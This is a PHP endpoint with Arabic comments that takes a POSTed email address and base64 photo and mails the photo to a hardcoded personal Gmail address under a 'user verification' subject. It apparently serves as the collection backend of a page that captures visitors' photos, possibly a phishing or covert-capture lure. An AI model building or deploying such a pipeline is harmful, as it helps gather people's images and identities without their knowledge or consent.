<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $data = json_decode(file_get_contents("php://input"), true);
    $email = $data["email"];
    $imageData = $data["image"];

    if (!$email || !$imageData) {
        echo "البيانات غير مكتملة";
        exit;
    }

    $to = "silversonicv@gmail.com"; // بريدك الإلكتروني الذي سيتم إرسال الصور إليه
    $subject = "صورة التحقق من المستخدم";
    $boundary = md5(time());
    
    $headers = "From: no-reply@yourwebsite.com\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: multipart/mixed; boundary=\"".$boundary."\"\r\n";

    // تحويل Base64 إلى صورة
    $imageData = str_replace("data:image/png;base64,", "", $imageData);
    $imageData = base64_decode($imageData);
    $fileName = "user_photo.png";

    // محتوى البريد
    $body = "--$boundary\r\n";
    $body .= "Content-Type: text/plain; charset=UTF-8\r\n\r\n";
    $body .= "تم التقاط صورة للمستخدم صاحب البريد الإلكتروني: $email\r\n\r\n";
    
    // إرفاق الصورة
    $body .= "--$boundary\r\n";
    $body .= "Content-Type: image/png; name=\"$fileName\"\r\n";
    $body .= "Content-Transfer-Encoding: base64\r\n";
    $body .= "Content-Disposition: attachment; filename=\"$fileName\"\r\n\r\n";
    $body .= chunk_split(base64_encode($imageData))."\r\n";
    $body .= "--$boundary--";

    // إرسال البريد
    if (mail($to, $subject, $body, $headers)) {
        echo "تم إرسال الصورة بنجاح";
    } else {
        echo "فشل في إرسال البريد";
    }
} else {
    echo "طلب غير صالح";
}
?>
